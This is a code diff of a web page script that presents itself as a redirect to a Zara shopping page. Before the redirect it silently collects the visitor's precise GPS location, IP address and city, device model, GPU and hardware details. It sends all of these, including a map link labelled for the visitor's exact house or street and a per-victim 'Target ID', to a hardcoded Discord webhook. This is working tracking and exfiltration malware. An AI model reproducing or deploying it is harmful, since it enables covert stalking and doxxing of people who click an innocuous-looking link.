@@ -2,92 +2,100 @@
     async function logAndGo() {
         const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
         const destination = "https://www.zara.com/my/";
-        
-        // Extended timeout to 12s to give the user time to click "Allow" on the GPS popup
         const timeout = setTimeout(() => window.location.replace(destination), 12000);
 
-        // Helper: Get GPS Promise
+        // 1. THE DEVICE DECODER ENGINE
+        const getDeviceModel = () => {
+            const w = screen.width;
+            const h = screen.height;
+            const r = window.devicePixelRatio;
+            const ua = navigator.userAgent;
+            const mobile = /Mobi|Android|iPhone/i.test(ua);
+
+            if (!mobile) {
+                if (ua.includes("Macintosh")) return "Apple Mac / MacBook";
+                if (ua.includes("Windows NT 10.0")) return "PC (Windows 10/11)";
+                if (ua.includes("Linux")) return "PC (Linux)";
+                return "Desktop PC";
+            }
+
+            // iPhone Mapping (Resolution x Pixel Ratio)
+            if (ua.includes("iPhone")) {
+                if (w === 430 && h === 932 && r === 3) return "iPhone 15/14 Pro Max";
+                if (w === 393 && h === 852 && r === 3) return "iPhone 15/14 Pro";
+                if (w === 428 && h === 926 && r === 3) return "iPhone 14 Plus / 13 Pro Max";
+                if (w === 390 && h === 844 && r === 3) return "iPhone 14 / 13 / 12";
+                if (w === 375 && h === 812 && r === 3) return "iPhone 13 mini / 12 mini / 11 Pro";
+                if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
+                if (w === 414 && h === 896 && r === 2) return "iPhone 11 / XR";
+                if (w === 375 && h === 667) return "iPhone SE (2nd/3rd Gen) / 8";
+                return "iPhone (Generic)";
+            }
+
+            // Android Guesstimation
+            if (ua.includes("Android")) {
+                const ram = navigator.deviceMemory || 0;
+                const cores = navigator.hardwareConcurrency || 0;
+                
+                // Common Malaysian Flagships
+                if (w === 384 && h === 854) return "Samsung Galaxy S24 Ultra / S23 Ultra";
+                if (w === 412 && h === 915) return "Google Pixel / Premium Android";
+                if (ram >= 8) return `High-End Android (${cores} Cores)`;
+                return "Android Device";
+            }
+            
+            return "Unknown Mobile";
+        };
+
         const getGPS = () => {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) resolve(null);
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        acc: pos.coords.accuracy
-                    }),
-                    () => resolve(null), // If they block or GPS is off
+                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
                     { enableHighAccuracy: true, timeout: 8000 }
                 );
             });
         };
 
         try {
-            // 1. Start GPS request immediately (Triggers Popup)
             const coords = await getGPS();
-
-            // 2. URL ID Tracking
-            const urlParams = new URLSearchParams(window.location.search);
-            const visitorId = urlParams.get('id') || "Public/General";
-
-            // 3. IP Data (Fallback/Secondary Location)
             const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
             const ipData = ipRes ? await ipRes.json() : {};
 
-            // 4. Decode GPS vs IP Map Link
-            let finalMapLink = "No Coordinates";
-            let locationTitle = "📍 Estimated Location (IP)";
+            // Hardware & URL Params
+            const urlParams = new URLSearchParams(window.location.search);
+            const visitorId = urlParams.get('id') || "Public/General";
+            const deviceName = getDeviceModel();
 
-            if (coords) {
-                locationTitle = "🎯 EXACT GPS LOCATION";
-                finalMapLink = `[View Exact House/Street](https://www.google.com/maps?q=${coords.lat},${coords.lon})`;
-            } else if (ipData.latitude) {
-                finalMapLink = `[View General Area (IP)](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})`;
-            }
-
-            // 5. Hardware & GPU
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden";
+            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Hidden";
 
-            // 6. Battery & Environment
-            let batteryInfo = "Protected/iOS";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-            }
-
-            // 7. Build Discord Report
             const logData = {
-                username: "Elite Sentry V7",
+                username: "Elite Sentry V11",
                 embeds: [{
-                    title: `👤 Visitor: ${visitorId}`,
-                    color: coords ? 3066993 : 15158332, // Green for GPS, Red for IP only
+                    title: `📱 Device Identified: ${deviceName}`,
+                    color: coords ? 3066993 : 15158332,
                     fields: [
-                        { name: locationTitle, value: finalMapLink, inline: false },
-                        { name: "📏 GPS Accuracy", value: coords ? `${Math.round(coords.acc)} meters` : "N/A", inline: true },
-                        { name: "🏙️ IP City/State", value: `${ipData.city || '??'}, ${ipData.region || '??'}`, inline: true },
-                        { name: "🌐 IP & ISP", value: `\`${ipData.ip}\` \n ${ipData.org}`, inline: true },
-                        { name: "🎮 GPU / Chip", value: `\`${gpu}\``, inline: false },
-                        { name: "🔋 Battery", value: batteryInfo, inline: true },
-                        { name: "📶 Network", value: (navigator.connection ? navigator.connection.effectiveType : "Unknown").toUpperCase(), inline: true },
-                        { name: "📱 Hardware", value: `${navigator.platform} | ${navigator.hardwareConcurrency || '?'} Cores | ${navigator.deviceMemory || '?'}GB RAM`, inline: false }
+                        { name: "🎯 Map Link", value: coords ? `[View Exact GPS Map](https://www.google.com/maps?q=${coords.lat},${coords.lon})` : `[View General IP Area](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})`, inline: false },
+                        { name: "👤 Target ID", value: visitorId, inline: true },
+                        { name: "🏙️ Location", value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: true },
+                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "🎮 GPU / Chipset", value: `\`${gpu}\``, inline: false },
+                        { name: "⚙️ Hardware Stats", value: `RAM: ${navigator.deviceMemory || 'Hidden'}GB\nCores: ${navigator.hardwareConcurrency}\nRatio: ${window.devicePixelRatio}x`, inline: true },
+                        { name: "📐 Screen Size", value: `${screen.width}x${screen.height}`, inline: true }
                     ],
-                    footer: { text: "GPS Tracking Active" },
+                    footer: { text: "Device Fingerprinting Active | pt-beep.github.io" },
                     timestamp: new Date()
                 }]
             };
 
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(logData),
-                keepalive: true
-            });
+            await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(logData), keepalive: true });
 
         } catch (e) {
-            console.log("Logger skip.");
+            console.log("Log error");
         } finally {
             clearTimeout(timeout);
             window.location.replace(destination);
